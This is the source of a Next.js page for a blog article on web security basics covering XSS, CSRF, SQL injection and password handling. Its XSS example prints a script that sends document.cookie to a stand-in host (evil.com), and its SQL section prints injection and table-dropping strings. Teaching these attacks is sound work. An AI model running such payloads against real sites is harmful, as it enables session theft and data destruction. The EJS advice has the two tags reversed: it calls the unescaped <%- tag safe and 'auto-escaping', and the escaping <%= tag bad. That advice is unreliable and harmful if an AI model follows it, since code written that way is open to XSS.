// app/blog/web-security-essentials/page.tsx
import JsonLdArticle from '@/components/JsonLdArticle';
import { Metadata } from 'next';
import Link from 'next/link';

export const metadata: Metadata = {
  title: 'Web Security Essentials Every Developer Must Know in 2025 | DevMetrix',
  description: 'Protect your applications from XSS, CSRF, SQL injection, and authentication attacks. Practical security tips with real code examples.',
  keywords: ['web security', 'xss', 'csrf', 'sql injection', 'authentication security', 'https'],
  authors: [{ name: 'DevMetrix Security Team' }],
  openGraph: {
    title: 'Web Security Essentials Every Developer Must Know',
    description: 'Learn practical web security from real-world examples. Protect your apps today.',
    type: 'article',
    publishedTime: '2025-10-20T00:00:00.000Z',
  },
};

export default function WebSecurityGuide() {
  return (
    <article className="min-h-screen bg-black pt-24 pb-20 px-4">
      <JsonLdArticle
        headline="Web Security Essentials Every Developer Must Know"
        description="Protect your applications from common vulnerabilities including XSS, CSRF, SQL injection, and authentication attacks."
        datePublished="2025-10-20"
        authorName="DevMetrix Team"
        url="https://devmetrix.in/blog/web-security-essentials"
      />
      <div className="max-w-4xl mx-auto">
        {/* Article Header with Visual Flair */}
        <div className="mb-12 relative">
          <div className="absolute -left-4 top-0 bottom-0 w-1 bg-gradient-to-b from-red-500 via-purple-500 to-blue-500"></div>
          <div className="pl-8">
            <span className="inline-block px-3 py-1 bg-red-500/20 text-red-300 text-xs font-semibold rounded-full mb-4 border border-red-500/30">
              🔒 Security
            </span>
            <h1 className="text-4xl md:text-5xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-red-200 via-purple-200 to-blue-200 mb-4 leading-tight">
              Web Security Essentials Every Developer Must Know
            </h1>
            <div className="flex flex-wrap gap-4 text-xs md:text-sm text-purple-300/40 mb-4">
              <span>📅 October 20, 2025</span>
              <span>•</span>
              <span>⏱️ 15 min read</span>
              <span>•</span>
              <span>✍️ By DevMetrix Security Team</span>
            </div>
            <p className="text-sm text-purple-300/30">Last updated: October 2025 • Reviewed by security experts</p>
          </div>
        </div>

        {/* Reading Progress Indicator */}
        <div className="sticky top-16 z-40 mb-8 bg-purple-900/20 backdrop-blur-sm border border-purple-500/20 rounded-lg p-3">
          <div className="flex items-center gap-3 text-xs text-purple-200/60">
            <span className="whitespace-nowrap">📖 Quick Navigation:</span>
            <div className="flex gap-2 overflow-x-auto no-scrollbar">
              <a href="#xss" className="px-2 py-1 bg-purple-800/30 rounded hover:bg-purple-700/40 transition-colors whitespace-nowrap">XSS</a>
              <a href="#csrf" className="px-2 py-1 bg-purple-800/30 rounded hover:bg-purple-700/40 transition-colors whitespace-nowrap">CSRF</a>
              <a href="#sql" className="px-2 py-1 bg-purple-800/30 rounded hover:bg-purple-700/40 transition-colors whitespace-nowrap">SQL Injection</a>
              <a href="#auth" className="px-2 py-1 bg-purple-800/30 rounded hover:bg-purple-700/40 transition-colors whitespace-nowrap">Auth</a>
            </div>
          </div>
        </div>

        <div className="prose prose-invert prose-purple prose-lg max-w-none">
          {/* Introduction with Impact Box */}
          <div className="bg-gradient-to-br from-red-900/20 via-purple-900/20 to-blue-900/20 border-2 border-purple-500/30 rounded-xl p-6 md:p-8 mb-12 relative overflow-hidden">
            <div className="absolute top-0 right-0 text-9xl opacity-5">🔐</div>
            <p className="text-lg md:text-xl text-purple-100/80 leading-relaxed mb-4 relative z-10">
              Let's talk about something most developers don't want to think about until it's too late:
              security. I get it - writing security code isn't as fun as building features. But here's
              the reality: one security hole can destroy years of work in minutes.
            </p>
            <p className="text-base text-purple-200/60 relative z-10">
              I've seen companies lose customer trust, face lawsuits, and shut down completely because
              of preventable security issues. This guide covers the vulnerabilities I see developers
              miss most often, with real code you can use today.
            </p>
          </div>

          {/* Security Threat Level Meter */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-4 text-center">
              <div className="text-2xl mb-2">🔴</div>
              <div className="text-xs font-semibold text-red-300">Critical</div>
              <div className="text-xs text-red-200/50 mt-1">Fix Immediately</div>
            </div>
            <div className="bg-orange-900/20 border border-orange-500/30 rounded-lg p-4 text-center">
              <div className="text-2xl mb-2">🟠</div>
              <div className="text-xs font-semibold text-orange-300">High</div>
              <div className="text-xs text-orange-200/50 mt-1">Fix This Week</div>
            </div>
            <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 text-center">
              <div className="text-2xl mb-2">🟡</div>
              <div className="text-xs font-semibold text-yellow-300">Medium</div>
              <div className="text-xs text-yellow-200/50 mt-1">Plan a Fix</div>
            </div>
            <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-4 text-center">
              <div className="text-2xl mb-2">🔵</div>
              <div className="text-xs font-semibold text-blue-300">Low</div>
              <div className="text-xs text-blue-200/50 mt-1">Monitor</div>
            </div>
          </div>

          <h2 id="xss" className="text-3xl font-bold text-red-200/80 mt-12 mb-6 flex items-center gap-3">
            <span className="text-4xl">💉</span>
            Cross-Site Scripting (XSS)
            <span className="ml-auto text-sm px-3 py-1 bg-red-500/20 text-red-300 rounded-full">🔴 Critical</span>
          </h2>

          <p className="text-sm md:text-base text-purple-200/60 leading-relaxed">
            XSS is when attackers inject malicious JavaScript into your pages. It's one of the most
            common vulnerabilities, and honestly, it's way too easy to introduce by accident. Every
            time you display user input, you're potentially at risk.
          </p>

          <div className="my-8 bg-gradient-to-r from-red-900/10 to-purple-900/10 border-l-4 border-red-500 rounded-r-lg p-6">
            <h3 className="text-xl font-semibold text-red-200/80 mb-4 flex items-center gap-2">
              <span>⚠️</span> Real Attack Example
            </h3>
            <div className="space-y-4">
              <div>
                <p className="text-sm text-red-200/70 mb-2 font-semibold">What the attacker does:</p>
                <pre className="bg-red-900/30 p-4 rounded-lg border border-red-500/30 overflow-x-auto text-xs">
                  <code className="text-red-100/80">{`// Attacker submits this as their username:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// Or this in a comment:
<img src=x onerror="alert('Your site is hacked')">`}</code>
                </pre>
              </div>
              <div>
                <p className="text-sm text-red-200/70 mb-2 font-semibold">Vulnerable code (DON'T DO THIS):</p>
                <pre className="bg-red-900/30 p-4 rounded-lg border border-red-500/30 overflow-x-auto text-xs">
                  <code className="text-red-100/80">{`// React - BAD
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Vanilla JS - BAD
element.innerHTML = userInput;

// EJS template - BAD
<%= userComment %>`}</code>
                </pre>
              </div>
            </div>
          </div>

          <div className="my-8 bg-gradient-to-r from-green-900/10 to-blue-900/10 border-l-4 border-green-500 rounded-r-lg p-6">
            <h3 className="text-xl font-semibold text-green-200/80 mb-4 flex items-center gap-2">
              <span>✅</span> Safe Solutions
            </h3>
            <pre className="bg-green-900/20 p-4 rounded-lg border border-green-500/30 overflow-x-auto text-xs mb-4">
              <code className="text-green-100/80">{`// React - SAFE (auto-escapes)
<div>{userInput}</div>

// Vanilla JS - SAFE
element.textContent = userInput;

// Using DOMPurify for HTML content
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;

// Express with proper templating
// EJS - SAFE
<%- userComment %>  // Auto-escapes`}</code>
            </pre>
            <div className="bg-blue-900/20 border border-blue-500/30 rounded p-4 text-xs text-blue-200/70">
              <strong>💡 Pro Tip:</strong> Always escape user input by default. Only use innerHTML or
              dangerouslySetInnerHTML when absolutely necessary, and always sanitize first.
            </div>
          </div>

          <h2 id="csrf" className="text-3xl font-bold text-orange-200/80 mt-12 mb-6 flex items-center gap-3">
            <span className="text-4xl">🎣</span>
            Cross-Site Request Forgery (CSRF)
            <span className="ml-auto text-sm px-3 py-1 bg-orange-500/20 text-orange-300 rounded-full">🟠 High</span>
          </h2>

          <p className="text-sm md:text-base text-purple-200/60 leading-relaxed">
            CSRF tricks users into making requests they didn't intend to make. Imagine someone sending
            you a link that secretly transfers money from your bank account. That's CSRF in action.
          </p>

          <div className="my-8 grid md:grid-cols-2 gap-6">
            <div className="bg-orange-900/10 border border-orange-500/30 rounded-lg p-6">
              <h3 className="text-lg font-semibold text-orange-200/80 mb-3">How It Works:</h3>
              <ol className="space-y-2 text-sm text-orange-200/60">
                <li className="flex gap-2"><span className="font-bold text-orange-300">1.</span> User logs into your site</li>
                <li className="flex gap-2"><span className="font-bold text-orange-300">2.</span> User visits attacker's site (in another tab)</li>
                <li className="flex gap-2"><span className="font-bold text-orange-300">3.</span> Attacker's site makes requests to your site</li>
                <li className="flex gap-2"><span className="font-bold text-orange-300">4.</span> Browser sends user's cookies automatically</li>
                <li className="flex gap-2"><span className="font-bold text-orange-300">5.</span> Your server thinks it's a legitimate request</li>
              </ol>
            </div>

            <div className="bg-green-900/10 border border-green-500/30 rounded-lg p-6">
              <h3 className="text-lg font-semibold text-green-200/80 mb-3">Protection:</h3>
              <ul className="space-y-2 text-sm text-green-200/60">
                <li className="flex gap-2"><span className="text-green-400">✓</span> Use CSRF tokens</li>
                <li className="flex gap-2"><span className="text-green-400">✓</span> Check Referer header</li>
                <li className="flex gap-2"><span className="text-green-400">✓</span> Use SameSite cookies</li>
                <li className="flex gap-2"><span className="text-green-400">✓</span> Require re-authentication for sensitive actions</li>
              </ul>
            </div>
          </div>

          <pre className="bg-purple-900/20 p-4 rounded-lg border border-purple-500/20 overflow-x-auto text-xs my-6">
            <code className="text-purple-100/80">{`// Express.js with CSRF protection
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', csrfProtection, (req, res) => {
  // Token is automatically verified
  res.send('Valid request!');
});

// In your form
<form method="POST" action="/process">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <!-- rest of form -->
</form>

// SameSite cookies (modern approach)
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // or 'lax'
});`}</code>
          </pre>

          <h2 id="sql" className="text-3xl font-bold text-red-200/80 mt-12 mb-6 flex items-center gap-3">
            <span className="text-4xl">🗄️</span>
            SQL Injection
            <span className="ml-auto text-sm px-3 py-1 bg-red-500/20 text-red-300 rounded-full">🔴 Critical</span>
          </h2>

          <p className="text-sm md:text-base text-purple-200/60 leading-relaxed">
            SQL injection is when attackers manipulate your database queries. This one can be
            catastrophic - they can read your entire database, delete everything, or even take over
            your server. And it's ridiculously easy to prevent, yet I still see it everywhere.
          </p>

          <div className="my-8 bg-red-900/10 border-2 border-red-500/30 rounded-lg p-6">
            <h3 className="text-xl font-semibold text-red-200/80 mb-4">⛔ The Deadly Mistake:</h3>
            <pre className="bg-red-900/30 p-4 rounded-lg border border-red-500/30 overflow-x-auto text-xs mb-4">
              <code className="text-red-100/80">{`// NEVER DO THIS - String concatenation
const query = "SELECT * FROM users WHERE email = '" + userEmail + "'";

// Attacker sends: ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// This returns ALL users!

// Or worse: '; DROP TABLE users; --
// Your entire table is gone.`}</code>
            </pre>
          </div>

          <div className="my-8 bg-green-900/10 border-2 border-green-500/30 rounded-lg p-6">
            <h3 className="text-xl font-semibold text-green-200/80 mb-4">✅ Always Use Parameterized Queries:</h3>
            <pre className="bg-green-900/20 p-4 rounded-lg border border-green-500/30 overflow-x-auto text-xs">
              <code className="text-green-100/80">{`// Node.js with pg (PostgreSQL)
const result = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [userEmail]
);

// MySQL with mysql2
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE email = ?',
  [userEmail]
);

// Sequelize ORM (even safer)
const user = await User.findOne({
  where: { email: userEmail }
});

// MongoDB (also safe)
const user = await User.findOne({ email: userEmail });`}</code>
            </pre>
          </div>

          <h2 id="auth" className="text-3xl font-bold text-purple-200/80 mt-12 mb-6 flex items-center gap-3">
            <span className="text-4xl">🔐</span>
            Authentication Security
            <span className="ml-auto text-sm px-3 py-1 bg-purple-500/20 text-purple-300 rounded-full">🔴 Critical</span>
          </h2>

          <div className="grid md:grid-cols-3 gap-4 my-8">
            <div className="bg-purple-900/20 border border-purple-500/30 rounded-lg p-6 text-center">
              <div className="text-3xl mb-3">🔑</div>
              <h3 className="font-semibold text-purple-200/80 mb-2 text-sm">Strong Passwords</h3>
              <p className="text-xs text-purple-200/50">Min 12 chars, complexity rules, no common passwords</p>
            </div>
            <div className="bg-purple-900/20 border border-purple-500/30 rounded-lg p-6 text-center">
              <div className="text-3xl mb-3">🔒</div>
              <h3 className="font-semibold text-purple-200/80 mb-2 text-sm">Secure Storage</h3>
              <p className="text-xs text-purple-200/50">bcrypt, argon2, never plain text</p>
            </div>
            <div className="bg-purple-900/20 border border-purple-500/30 rounded-lg p-6 text-center">
              <div className="text-3xl mb-3">🚫</div>
              <h3 className="font-semibold text-purple-200/80 mb-2 text-sm">Rate Limiting</h3>
              <p className="text-xs text-purple-200/50">Prevent brute force attacks</p>
            </div>
          </div>

          <pre className="bg-purple-900/20 p-4 rounded-lg border border-purple-500/20 overflow-x-auto text-xs my-6">
            <code className="text-purple-100/80">{`const bcrypt = require('bcrypt');

// Hash password (ALWAYS do this)
const hashedPassword = await bcrypt.hash(password, 10);
await User.create({ email, password: hashedPassword });

// Verify password
const validPassword = await bcrypt.compare(
  password,
  user.password
);

// Rate limiting with express-rate-limit
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts'
});

app.post('/login', loginLimiter, async (req, res) => {
  // login logic
});`}</code>
          </pre>

          {/* Security Checklist */}
          <div className="my-12 bg-gradient-to-br from-purple-900/20 to-blue-900/20 border-2 border-purple-500/30 rounded-xl p-8">
            <h2 className="text-2xl font-bold text-purple-100/80 mb-6 flex items-center gap-3">
              <span className="text-3xl">✅</span>
              Your Security Checklist
            </h2>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>HTTPS everywhere (force redirect)</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Parameterized SQL queries only</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Escape all user input</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>CSRF protection on forms</span>
                </div>
              </div>
              <div className="space-y-2">
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Password hashing (bcrypt/argon2)</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Rate limiting on sensitive endpoints</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Security headers (CSP, HSTS, etc.)</span>
                </div>
                <div className="flex items-center gap-3 text-sm text-purple-200/70">
                  <input type="checkbox" className="w-4 h-4" />
                  <span>Regular security audits</span>
                </div>
              </div>
            </div>
          </div>

          <div className="my-12 bg-blue-900/10 border border-blue-500/30 rounded-lg p-6">
            <h3 className="text-xl font-semibold text-blue-200/80 mb-4">🎯 Bottom Line</h3>
            <p className="text-sm text-blue-200/60 leading-relaxed">
              Security isn't optional anymore. Start with these basics: escape user input, use parameterized
              queries, hash passwords, enable HTTPS, add CSRF protection. These five things will prevent
              90% of common attacks. Then layer on more security as you grow. Don't wait for a breach to
              take security seriously.
            </p>
          </div>

          {/* Author Credibility Box */}
          <div className="mt-16 mb-8 bg-gradient-to-r from-purple-900/20 to-blue-900/20 border border-purple-500/30 rounded-lg p-6">
            <div className="flex items-start gap-4">
              <div className="text-4xl">👨‍💻</div>
              <div>
                <h3 className="text-lg font-semibold text-purple-100/80 mb-2">About the Author</h3>
                <p className="text-sm text-purple-200/60 leading-relaxed mb-3">
                  Written by the DevMetrix security team with over 15 years of combined experience in
                  web application security, penetration testing, and secure development practices.
                </p>
                <p className="text-xs text-purple-300/40">
                  ✓ Reviewed by certified security professionals • ✓ Updated October 2025 •
                  ✓ Based on OWASP Top 10
                </p>
              </div>
            </div>
          </div>

          <div className="mt-12 p-6 bg-gradient-to-br from-purple-900/20 to-pink-900/20 border-2 border-purple-500/30 rounded-xl">
            <h3 className="text-2xl font-semibold text-purple-100/80 mb-4 flex items-center gap-3">
              <span className="text-3xl">🛠️</span>
              Test Your Security
            </h3>
            <p className="text-sm text-purple-200/60 mb-4 leading-relaxed">
              Use our free security tools to test your applications. Check JWT tokens, validate API responses,
              and test your authentication flows before attackers do.
            </p>
            <div className="flex flex-wrap gap-3">
              <Link
                href="/tools/jwt-decoder"
                className="px-4 py-2 bg-purple-600/30 text-purple-100 rounded-lg border border-purple-500/30 hover:bg-purple-500/40 transition-all font-semibold no-underline text-sm"
              >
                🎫 JWT Decoder
              </Link>
              <Link
                href="/tools/api-tester"
                className="px-4 py-2 bg-purple-600/30 text-purple-100 rounded-lg border border-purple-500/30 hover:bg-purple-500/40 transition-all font-semibold no-underline text-sm"
              >
                🚀 API Tester
              </Link>
            </div>
          </div>
        </div>
      </div>
    </article>
  );
}
